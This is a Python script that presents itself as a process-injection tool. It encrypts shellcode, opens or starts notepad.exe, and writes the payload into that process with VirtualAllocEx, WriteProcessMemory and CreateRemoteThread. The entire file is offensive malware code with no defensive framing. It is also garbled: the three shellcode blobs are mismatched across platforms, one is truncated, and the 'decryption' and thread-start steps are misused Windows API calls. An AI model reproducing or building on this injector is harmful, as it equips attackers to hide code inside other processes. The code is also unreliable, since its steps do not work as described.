import psutil
import subprocess
from cryptography.fernet import Fernet
from ctypes import *
import ctypes
import sys

# Replace with the desired payload
payload = b'\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xc0\x50\x48\xbb\x2f\x63\x61\x6c\x63\x2e\x65\x78\x65\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05'
# Replace with the desired payload
payload = b'\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\xc1\xea\x20\x48\x83\xec\x10\x52\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x24\x49\x01\xd0\xe3\x5c\x49\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44'
payload = b'\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd2\x31\xc9\xb1\xff\x31\xff\x57\xe2\xfd\x68\x72\x6f\x63\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd0\x31\xc9\x51\xff\xd6'
# Encrypt the payload using Fernet
key = Fernet.generate_key()
f = Fernet(key)
encrypted_payload = f.encrypt(payload)

# Find the process to inject the payload into
process_name = "notepad.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Allocate memory in the target process to store the encrypted payload
process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, target_process.pid)
memory_allocation = windll.kernel32.VirtualAllocEx(process_handle, None, len(encrypted_payload), 0x3000, 0x04)

# Write the encrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation, encrypted_payload, len(encrypted_payload), None)

# Calculate the address of the entry point in the loaded module
loaded_module = windll.kernel32.LoadLibraryA("kernel32.dll")
entry_point_address = windll.kernel32.GetProcAddress(loaded_module, "LoadLibraryA") + 5

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point_address, memory_allocation, 0, None)

# Decrypt the payload in the target process
decrypted_payload_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(payload), 0x3000, 0x04)
decryption_key_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(key), 0x3000, 0x04)
windll.kernel32.WriteProcessMemory(process_handle, decryption_key_address, key, len(key), None)
decryption_function_address = windll.kernel32.GetProcAddress(loaded_module, "CryptUnprotectData")

# Create a remote thread in the target process to decrypt the payload
windll.kernel32.CreateRemoteThread(process_handle, None, 0, decryption_function_address, decryption_key_address, decrypted_payload_address, None)

# Execute the decrypted payload
ctypes.windll.kernel32.VirtualProtectEx(process_handle, decrypted_payload_address, len(payload), 0x40, byref(c_ulong()))
ctypes.windll.kernel32.WriteProcessMemory(process_handle, decrypted_payload_address, payload, len(payload), None)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, decrypted_payload_address, None, 0, None)

# Troubleshooting and Modifications
# To troubleshoot any issues, enable debugging mode and print any error messages
# To modify the code, add or remove functionality as needed
# For example, to inject the payload into a different process, modify the process_name variable

# Enable debugging mode
sys.getwindowsversion()